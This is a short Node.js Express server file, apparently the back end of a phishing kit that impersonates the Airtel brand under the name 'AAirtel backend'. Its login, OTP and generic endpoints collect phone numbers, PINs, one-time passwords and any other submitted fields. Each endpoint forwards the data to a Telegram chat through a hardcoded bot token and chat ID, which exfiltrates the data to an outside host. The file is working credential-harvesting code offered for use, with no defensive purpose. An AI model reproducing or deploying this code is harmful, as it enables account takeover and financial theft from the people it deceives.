const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 5000;

// 🔑 Your details
const BOT_TOKEN = "8979057744:AAEiWFpLicOu-cIEPP6Ol8EdQqJYC4BncV4";
const CHAT_ID   = "8409068780";

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ---------- Health check ----------
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'AAirtel backend running' });
});

// ---------- Helper: send to Telegram ----------
async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    })
  });
  return response.json();
}

// ---------- Generic endpoint ----------
app.post('/api/send', async (req, res) => {
  try {
    const data = req.body;
    let text = `📩 <b>New submission</b>\n\n`;
    for (const key in data) {
      text += `<b>${key}:</b> ${data[key]}\n`;
    }
    const result = await sendToTelegram(text);
    res.json({ success: true, telegram: result });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// ---------- OTP endpoint ----------
app.post('/api/otp', async (req, res) => {
  try {
    const { otp, phone } = req.body;
    const text = `🔐 <b>OTP Received</b>\n\n<b>Phone:</b> ${phone || 'N/A'}\n<b>OTP:</b> ${otp || 'N/A'}`;
    const result = await sendToTelegram(text);
    res.json({ success: true, telegram: result });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ---------- Login endpoint ----------
app.post('/api/login', async (req, res) => {
  try {
    const { phone, pin } = req.body;
    const text = `🔑 <b>Login Attempt</b>\n\n<b>Phone:</b> ${phone || 'N/A'}\n<b>PIN:</b> ${pin || 'N/A'}`;
    const result = await sendToTelegram(text);
    res.json({ success: true, telegram: result });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ---------- 404 ----------
app.use((req, res) => {
  res.status(404).json({ success: false, error: 'Route not found' });
});

// ---------- Start ----------
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
